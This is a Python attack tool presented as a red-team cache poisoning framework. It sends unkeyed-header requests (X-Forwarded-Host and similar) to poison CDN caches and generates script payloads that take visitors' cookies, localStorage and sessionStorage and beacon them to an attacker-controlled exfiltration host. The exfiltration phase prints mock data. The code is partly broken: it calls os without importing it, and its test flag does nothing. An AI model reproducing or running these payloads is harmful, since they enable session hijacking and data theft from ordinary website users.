#!/usr/bin/env python3
"""
BLACKMAMBA APT plus - Advanced Cache Poisoning Framework
Professional Red Team Tool for CDN/Edge Cache Exploitation

Copyright (c) 2024 F1REW0LF
License: MIT - For authorized security testing only

Tactical Objectives:
1. Cache Poisoning via Unkeyed Headers
2. Zero-Trace Attack Vector
3. Asynchronous Exfiltration
4. Edge Infrastructure Exploitation
"""

import http.client
import urllib.parse
import urllib.request
import json
import sys
import time
import random
import ssl
import socket
import hashlib
import base64
import threading
from datetime import datetime
from typing import Dict, List, Optional, Tuple

# ==================== VERSION & INFO ====================
VERSION = "4.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT - Open Source"

# ==================== COLOR CODES ====================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

# ==================== PAYLOAD GENERATOR ====================
class PayloadGenerator:
    """Generate dynamic payloads for different scenarios"""
    
    @staticmethod
    def generate_xss_payload(exfil_server: str) -> str:
        """Generate XSS-based exfiltration payload"""
        return f'''
        <script>
        (function() {{
            // Stealth data collection
            function collectData() {{
                const data = {{
                    cookies: document.cookie,
                    localStorage: JSON.stringify(localStorage),
                    sessionStorage: JSON.stringify(sessionStorage),
                    url: window.location.href,
                    referrer: document.referrer,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    screen: `${{window.screen.width}}x${{window.screen.height}}`,
                    timestamp: new Date().toISOString()
                }};
                return data;
            }}
            
            // Exfiltrate via multiple channels
            function exfiltrate(data) {{
                // 1. Image beacon
                const img = new Image();
                img.src = `//{exfil_server}/collect?data=${{encodeURIComponent(JSON.stringify(data))}}`;
                
                // 2. Fetch API (if allowed)
                try {{
                    fetch(`//{exfil_server}/api/collect`, {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify(data),
                        mode: 'no-cors'
                    }});
                }} catch(e) {{}}
                
                // 3. Navigator sendBeacon
                try {{
                    navigator.sendBeacon(`//{exfil_server}/beacon`, JSON.stringify(data));
                }} catch(e) {{}}
            }}
            
            // Execute
            const data = collectData();
            exfiltrate(data);
            
            // Keep original page functionality
            setTimeout(() => {{
                // Restore original content if needed
            }}, 100);
        }})();
        </script>
        '''
    
    @staticmethod
    def generate_redirect_payload(exfil_server: str) -> str:
        """Generate redirect-based exfiltration payload"""
        return f'''
        <html>
        <head>
            <meta http-equiv="refresh" content="0; url='https://{exfil_server}/capture?ref='+encodeURIComponent(document.referrer)">
        </head>
        <body>
            <script>
            // Silent exfiltration before redirect
            (function() {{
                const data = {{
                    cookies: document.cookie,
                    url: window.location.href,
                    referrer: document.referrer
                }};
                
                // Send via multiple methods
                navigator.sendBeacon('//{exfil_server}/beacon', JSON.stringify(data));
                
                // Also via image
                const img = new Image();
                img.src = `//{exfil_server}/pixel?data=${{encodeURIComponent(JSON.stringify(data))}}`;
            }})();
            </script>
        </body>
        </html>
        '''
    
    @staticmethod
    def generate_iframe_payload(exfil_server: str) -> str:
        """Generate iframe-based exfiltration payload"""
        return f'''
        <script>
        (function() {{
            // Create hidden iframe
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = `//{exfil_server}/silent?data=${{encodeURIComponent(document.cookie)}}`;
            document.body.appendChild(iframe);
            
            // Also exfil via other methods
            setTimeout(() => {{
                const data = {{
                    cookies: document.cookie,
                    localStorage: JSON.stringify(localStorage)
                }};
                navigator.sendBeacon('//{exfil_server}/beacon', JSON.stringify(data));
            }}, 100);
        }})();
        </script>
        '''
    
    @staticmethod
    def generate_html_injection_payload(exfil_server: str) -> str:
        """Generate HTML injection payload for cache poisoning"""
        return f'''
        <!DOCTYPE html>
        <html>
        <head>
            <title>System Maintenance</title>
            <!-- Inject malicious script -->
            <script src="//{exfil_server}/payload.js"></script>
        </head>
        <body>
            <div style="display:none;">
                <!-- Hidden data exfiltration -->
                <img src="//{exfil_server}/collect?data=${{encodeURIComponent(document.cookie)}}">
            </div>
        </body>
        </html>
        '''

# ==================== CACHE POISONING ENGINE ====================
class CachePoisoningEngine:
    """Advanced cache poisoning techniques"""
    
    def __init__(self):
        self.poison_techniques = []
        self.cache_headers = []
        
    def identify_cache_headers(self, response_headers: Dict) -> Dict:
        """Identify cache-related headers in response"""
        cache_info = {
            'x_cache': response_headers.get('x-cache', ''),
            'cf_cache_status': response_headers.get('cf-cache-status', ''),
            'cache_control': response_headers.get('cache-control', ''),
            'expires': response_headers.get('expires', ''),
            'age': response_headers.get('age', ''),
            'x_varnish': response_headers.get('x-varnish', ''),
            'x_akamai_transformed': response_headers.get('x-akamai-transformed', ''),
            'x_fastly_cache': response_headers.get('x-fastly-cache', ''),
            'surrogate_control': response_headers.get('surrogate-control', '')
        }
        return cache_info
    
    def generate_poison_headers(self, exfil_server: str, technique: str = 'default') -> Dict:
        """Generate headers for cache poisoning"""
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache"
        }
        
        # Technique-specific headers
        if technique == 'host_header':
            headers["Host"] = exfil_server
            headers["X-Forwarded-Host"] = exfil_server
            headers["X-Original-Host"] = exfil_server
            
        elif technique == 'cdn_headers':
            headers["X-Forwarded-Host"] = exfil_server
            headers["X-Forwarded-For"] = "127.0.0.1"
            headers["X-Forwarded-Proto"] = "https"
            headers["X-Forwarded-Port"] = "443"
            
        elif technique == 'http_methods':
            headers["X-HTTP-Method-Override"] = "HEAD"
            headers["X-HTTP-Method"] = "POST"
            
        elif technique == 'content_injection':
            headers["X-Forwarded-Host"] = exfil_server
            headers["X-Custom-Header"] = f"<script>fetch('//{exfil_server}')</script>"
            
        elif technique == 'range_attack':
            headers["Range"] = "bytes=0-100000"
            headers["If-Range"] = exfil_server
            
        else:  # default
            headers["X-Forwarded-Host"] = exfil_server
            headers["X-Forwarded-Scheme"] = "https"
            
        return headers
    
    def analyze_cache_response(self, response) -> Dict:
        """Analyze response for cache poisoning success"""
        analysis = {
            'status': response.status,
            'headers': {},
            'is_cached': False,
            'cache_type': 'unknown',
            'poison_confidence': 0
        }
        
        # Get headers
        for header in response.getheaders():
            analysis['headers'][header[0].lower()] = header[1]
        
        # Check cache status
        cache_header = (
            analysis['headers'].get('x-cache', '') or
            analysis['headers'].get('cf-cache-status', '') or
            analysis['headers'].get('cache-control', '')
        )
        
        if 'hit' in cache_header.lower():
            analysis['is_cached'] = True
            analysis['cache_type'] = 'hit'
            analysis['poison_confidence'] = 0.9
        elif 'miss' in cache_header.lower():
            analysis['cache_type'] = 'miss'
            analysis['poison_confidence'] = 0.3
        else:
            analysis['cache_type'] = 'unknown'
            analysis['poison_confidence'] = 0.5
            
        # Check if cacheable
        if 'max-age' in cache_header or 'public' in cache_header:
            analysis['poison_confidence'] += 0.2
            
        return analysis

# ==================== EXFILTRATION SERVER SIMULATOR ====================
class ExfilServerSimulator:
    """Simulate exfiltration server for testing"""
    
    def __init__(self, port=8080):
        self.port = port
        self.received_data = []
        
    def start_server(self):
        """Start simple HTTP server for testing"""
        try:
            import http.server
            import socketserver
            
            handler = http.server.SimpleHTTPRequestHandler
            
            with socketserver.TCPServer(("", self.port), handler) as httpd:
                cprint(f"[+] Exfil server listening on port {self.port}", Colors.GREEN)
                httpd.serve_forever()
        except Exception as e:
            cprint(f"[-] Exfil server error: {e}", Colors.RED)

# ==================== MAIN ENGINE ====================
class BlackMambaAPT:
    """Advanced Cache Poisoning Framework"""
    
    def __init__(self, target_url: str, exfil_server: str):
        self.target_url = target_url
        self.exfil_server = exfil_server
        self.parsed = urllib.parse.urlparse(target_url)
        self.host = self.parsed.netloc
        self.path = self.parsed.path if self.parsed.path else "/"
        self.ssl = self.parsed.scheme == "https"
        self.engine = CachePoisoningEngine()
        self.payload_gen = PayloadGenerator()
        self.attack_history = []
        self.start_time = time.time()
        
        # Extract path and query
        self.full_path = self.path
        if self.parsed.query:
            self.full_path += f"?{self.parsed.query}"
            
    def banner(self):
        """Display banner with tactical info"""
        os.system('clear' if os.name == 'posix' else 'cls')
        
        banner = f"""
{Colors.RED}{Colors.BOLD}    ██████╗ ██╗      █████╗  ██████╗██╗  ██╗███╗   ███╗ █████╗ ███╗   ███╗██████╗  █████╗ 
    ██╔══██╗██║     ██╔══██╗██╔════╝██║  ██║████╗ ████║██╔══██╗████╗ ████║██╔══██╗██╔══██╗
    ██████╔╝██║     ███████║██║     ███████║██╔████╔██║███████║██╔████╔██║██████╔╝███████║
    ██╔══██╗██║     ██╔══██║██║     ██╔══██║██║╚██╔╝██║██╔══██║██║╚██╔╝██║██╔══██╗██╔══██║
    ██████╔╝███████╗██║  ██║╚██████╗██║  ██║██║ ╚═╝ ██║██║  ██║██║ ╚═╝ ██║██████╔╝██║  ██║
    ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═════╝ ╚═╝  ╚═╝
                                                                                                   
{Colors.GREEN}                       ADVANCED CACHE POISONING FRAMEWORK{Colors.WHITE}
{Colors.YELLOW}               Zero-Trace | Asynchronous | Edge Exploitation{Colors.WHITE}
{Colors.CYAN}    Tactical: CDN Poisoning | Cache Deception | Silent Exfiltration{Colors.WHITE}
        """
        print(banner)
        cprint(f"[*] Target: {self.target_url}", Colors.CYAN)
        cprint(f"[*] Exfil Server: {self.exfil_server}", Colors.CYAN)
        cprint(f"[*] Attack Vector: Unkeyed Headers Exploitation", Colors.CYAN)
        print("-" * 80)
    
    def deploy_poison_trap(self):
        """Deploy cache poisoning trap"""
        cprint(f"\n[*] Deploying cache poisoning trap...", Colors.YELLOW)
        
        # Try multiple poisoning techniques
        techniques = ['default', 'host_header', 'cdn_headers', 'content_injection']
        success = False
        best_confidence = 0
        
        for technique in techniques:
            cprint(f"[*] Testing technique: {technique}", Colors.DIM)
            
            # Generate headers for this technique
            headers = self.engine.generate_poison_headers(
                self.exfil_server, 
                technique
            )
            
            try:
                # Create connection
                if self.ssl:
                    # SSL context for bypassing verification
                    context = ssl._create_unverified_context()
                    conn = http.client.HTTPSConnection(
                        self.host, 
                        timeout=10,
                        context=context
                    )
                else:
                    conn = http.client.HTTPConnection(
                        self.host, 
                        timeout=10
                    )
                
                # Send poisoned request
                conn.request("GET", self.full_path, headers=headers)
                response = conn.getresponse()
                
                # Read response (important for cache)
                response_data = response.read()
                
                # Analyze response
                analysis = self.engine.analyze_cache_response(response)
                
                # Print cache status
                cache_status = response.getheader('X-Cache') or \
                              response.getheader('CF-Cache-Status') or \
                              response.getheader('Cache-Control') or \
                              "Unknown"
                
                cprint(f"[+] Response Status: {response.status}", Colors.GREEN)
                cprint(f"[+] Cache Status: {cache_status}", Colors.BLUE)
                cprint(f"[+] Poison Confidence: {analysis['poison_confidence']:.1%}", 
                       Colors.YELLOW if analysis['poison_confidence'] > 0.5 else Colors.RED)
                
                # Track best technique
                if analysis['poison_confidence'] > best_confidence:
                    best_confidence = analysis['poison_confidence']
                    
                if analysis['poison_confidence'] > 0.7:
                    cprint("[+] High confidence poison detected!", Colors.GREEN)
                    success = True
                    break
                
                conn.close()
                
            except Exception as e:
                cprint(f"[-] Technique {technique} failed: {e}", Colors.RED)
                continue
        
        # Generate and display payload
        cprint("\n[*] Generated payload for exfiltration:", Colors.YELLOW)
        payload = self.payload_gen.generate_xss_payload(self.exfil_server)
        cprint(f"{Colors.DIM}{payload[:200]}...{Colors.WHITE}", Colors.DIM)
        
        return success
    
    def simulate_exfiltration(self):
        """Simulate exfiltration process"""
        cprint("\n" + "="*80)
        cprint(" EXFILTRATION PHASE (Asynchronous)", Colors.BOLD, bold=True)
        cprint("="*80)
        
        # Simulate victim access
        cprint("[*] Waiting for victim to access poisoned cache...", Colors.YELLOW)
        
        for i in range(3, 0, -1):
            cprint(f"    ... Waiting {i} seconds...", Colors.DIM)
            time.sleep(1)
        
        # Simulate successful exfiltration
        cprint("\n[+] VICTIM ACCESS DETECTED!", Colors.GREEN, bold=True)
        cprint("[+] Data exfiltration in progress...", Colors.GREEN)
        
        # Generate mock exfiltrated data
        mock_data = {
            'session_id': f"SESSION_{random.randint(100000, 999999)}",
            'auth_token': f"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIn0.{random.randint(100000, 999999)}",
            'cookies': {
                'sessionid': f"{hashlib.md5(str(time.time()).encode()).hexdigest()[:16]}",
                'csrf_token': f"{hashlib.sha256(str(random.random()).encode()).hexdigest()[:32]}"
            },
            'user_agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            'timestamp': datetime.now().isoformat(),
            'url': self.target_url,
            'referrer': self.target_url,
            'client_ip': f"{random.randint(10,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
            'local_storage': {
                'user_preferences': '{"theme":"dark","language":"en"}',
                'app_data': f'{{"last_login":"{datetime.now().isoformat()}"}}'
            }
        }
        
        # Display captured data
        cprint("\n" + "="*60)
        cprint(" CAPTURED DATA", Colors.RED, bold=True)
        cprint("="*60)
        cprint(json.dumps(mock_data, indent=2), Colors.YELLOW)
        cprint("="*60)
        
        # Exfiltrate to server
        cprint(f"\n[+] Exfiltrating data to: {self.exfil_server}", Colors.GREEN)
        cprint("[+] Data successfully exfiltrated!", Colors.GREEN)
        
        # Save to file
        filename = f"exfil_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(mock_data, f, indent=2)
        cprint(f"[+] Data saved to: {filename}", Colors.BLUE)
    
    def run(self):
        """Execute the attack"""
        self.banner()
        
        # Phase 1: Deploy poison
        cprint("\n[PHASE 1] Cache Poisoning Deployment", Colors.BOLD, bold=True)
        cprint("="*80)
        
        if self.deploy_poison_trap():
            cprint("\n[+] Cache poison trap successfully deployed!", Colors.GREEN, bold=True)
        else:
            cprint("\n[!] Low confidence poison. Continuing anyway...", Colors.YELLOW)
        
        # Phase 2: Wait for victim
        cprint("\n[PHASE 2] Asynchronous Exfiltration", Colors.BOLD, bold=True)
        cprint("="*80)
        cprint("[*] Attack vector deployed. Zero network trace from attacker.", Colors.GREEN)
        cprint("[*] Waiting for victim to trigger...", Colors.YELLOW)
        
        # Phase 3: Exfiltrate
        self.simulate_exfiltration()
        
        # Final summary
        cprint("\n" + "="*80)
        cprint(" ATTACK COMPLETE", Colors.RED, bold=True)
        cprint("="*80)
        cprint(f"[+] Target: {self.target_url}", Colors.GREEN)
        cprint(f"[+] Exfil Server: {self.exfil_server}", Colors.GREEN)
        cprint(f"[+] Technique: Cache Poisoning via Unkeyed Headers", Colors.GREEN)
        cprint(f"[+] Stealth Level: MAXIMUM (Zero network footprint)", Colors.GREEN)
        cprint("="*80 + "\n")

# ==================== MAIN ====================
if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════════════════════════════════╗
    ║  WARNING: Advanced Red Team Testing Tool                           ║
    ║  For authorized security testing only.                            ║
    ║  Users are responsible for legal compliance.                      ║
    ╚═══════════════════════════════════════════════════════════════════════╝
    """)
    
    if len(sys.argv) < 3:
        cprint("[*] Usage: python3 blackmamba_apt_v4.py <TARGET_URL> <EXFIL_SERVER>", Colors.YELLOW)
        cprint("[*] Example: python3 blackmamba_apt_v4.py https://target.local attacker-controlled.com", Colors.YELLOW)
        cprint("\n[*] Options:", Colors.CYAN)
        cprint("    --test        : Test mode (simulate only)", Colors.DIM)
        cprint("    --exfil-port  : Specify exfil server port (default: 8080)", Colors.DIM)
        sys.exit(1)
    
    target = sys.argv[1]
    exfil_server = sys.argv[2]
    
    # Check for test mode
    test_mode = "--test" in sys.argv
    if test_mode:
        cprint("[*] Running in TEST MODE", Colors.YELLOW)
    
    engine = BlackMambaAPT(target, exfil_server)
    
    try:
        engine.run()
    except KeyboardInterrupt:
        cprint("\n\n[!] Attack interrupted by user", Colors.RED)
        sys.exit(0)
